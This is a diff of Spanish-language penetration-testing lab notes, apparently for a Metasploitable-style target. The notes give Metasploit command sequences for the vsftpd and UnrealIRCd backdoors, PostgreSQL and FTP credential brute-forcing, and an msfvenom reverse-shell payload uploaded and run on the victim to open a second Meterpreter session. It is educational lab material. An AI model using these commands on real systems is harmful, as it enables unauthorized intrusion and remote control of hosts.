@@ -253,20 +253,17 @@ sessions -i <ID_SESION>
 | **Módulo Metasploit** | `exploit/unix/ftp/vsftpd_234_backdoor` [^10] |
 
 ```bash
-# 1
+# 1 Iniciar
 msfconsole
 
-# 2
+# 2 Buscar el backdoor
 search vsftpd
-
-# 3
 use exploit/unix/ftp/vsftpd_234_backdoor
 
-# 4 
+# 4 Configurar y explotar
 show payloads
 set payload <payload>
 
-# 5
 exploit
 ```
 ![](attachments/{AA746A9D-E5DD-4EF4-88BC-51EB0C86DB5C}.png)
@@ -282,20 +279,17 @@ exploit
 | **Módulo Metasploit** | `exploit/unix/irc/unreal_ircd_3281_backdoor` [^12] |
 
 ```bash
-# 1
+# 1 Iniciar
 msfconsole
 
-# 2
+# 2 Buscar el backdoor
 search ircd
-
-# 3
 use exploit/unix/irc/unreal_ircd_3281_backdoor
 
-# 4 
+# 4  Configurar y explotar
 show payloads
 set payload cmd/unix/reverse_perl
 
-# 5
 exploit
 ```
 ![](attachments/Pasted%20image%2020260714184917.png)
@@ -324,8 +318,6 @@ set BLANK_PASSWORDS true
 
 exploit
 
-
-
 # 4. Una vez obtenidas las credenciales seleccionar exploit
 use exploit/linux/postgres/postgres_payload
 
@@ -337,9 +329,9 @@ set payload linux/x86/meterpreter/reverse_tcp
 exploit
 
 # 5. Post-explotación con Meterpreter
-getuid          # Usuario actual
-sysinfo         # Sistema operativo y versión
-ifconfig        # Interfaces de red
+getuid         
+sysinfo         
+ifconfig        
 ```
 ![](attachments/{6D6DE5B3-9789-40B9-8D69-C63462B0FEE4}.png)
 ![](attachments/{5545ECE0-2813-42C6-9268-C73BBFEA21BB}.png)
@@ -360,7 +352,6 @@ use auxiliary/scanner/ftp/ftp_login
 set USERPASS_FILE /usr/share/wordlists/metasploit/piata_ssh_userpass.txt
 
 exploit
-
 ```
 ![](attachments/{1B8BE9E7-78A1-48F5-883D-ADC5AB797D69}.png)
 ![](attachments/{1C9E4E2D-2719-4326-947A-A12C9E3D9066}.png)
@@ -404,39 +395,33 @@ vncviewer <IP_VICTIMA>:5900
 ### Guía de comandos
 
 ```bash
-# PASO 0 — Obtener sesión Meterpreter inicial (UnrealIRCd)
+# 0. Obtener sesión Meterpreter inicial (UnrealIRCd)
 use exploit/unix/irc/unreal_ircd_3281_backdoor
 set payload cmd/unix/reverse_perl
 exploit
 
 # → sesión Meterpreter 1 abierta
-
-# PASO 1 — Generar payload con msfvenom (desde otra terminal Kali)
-#          Usar puerto DISTINTO (4446) para evitar conflicto
-#          con la sesión 1
+# 1. Generar payload con msfvenom (desde otra terminal Kali)
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4446 -f elf -o /tmp/payload.elf
 
-# PASO 2 — Handler en msfconsole con ese puerto, en background
+# 2. Handler en msfconsole con ese puerto, en background
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
-set LHOST <IP_ATACANTE>
-set LPORT 4446
 exploit -j
 
-# PASO 3 — Subir payload a la víctima (desde sesión 1)
+# 3. Subir payload a la víctima (desde sesión Meterpreter 1)
 sessions -i 1
 upload /tmp/payload.elf /tmp/payload.elf
 
-# PASO 4 — Asignar permisos de ejecución (desde shell de la víctima)
+# 4. Asignar permisos de ejecución (desde shell de la víctima de sesión Meterpreter 1)
 shell
 chmod +x /tmp/payload.elf
-exit
 
-# PASO 5 — Ejecutar payload
-execute -f /tmp/payload.elf
+# 5. Ejecutar payload
+/tmp/payload.elf
 # El handler recibe conexión y entrega etapa Meterpreter
 
-# PASO 6 — La sesión 2 se abre automáticamente
+# 6. La sesión 2 se abre automáticamente. Comprobamos con: 
 sessions
 sessions -i 2
 
@@ -450,11 +435,14 @@ cat /etc/*release
 
 
 ![](attachments/{76217B7C-0EC9-4FC0-B541-5E3610524F24}.png)
-
+![](attachments/{5AAA15A9-BB74-49D9-89AB-C75D705D910F}.png)
 ![](attachments/{460848D4-543D-4CD6-AB85-CCD68853B1D5}.png)
-
-
-
+![](attachments/{F9D10D78-318D-4A1B-B53E-8338CB9A08AD}.png)
+![](attachments/{674523C6-EE36-4540-9228-FB5563D7A4CF}.png)
+![](attachments/{D1B19ABD-49AE-4F4F-A7BF-66E49F489C68}.png)
+![](attachments/{D308DFB2-C0D5-4B2F-8213-8D638B4A0382}.png)
+![](attachments/{107C38FC-EBD9-4818-AB9A-9191BB3CF3CC}.png)
+![](attachments/Pasted%20image%2020260714210857.png)
 
 ## Referencias
 
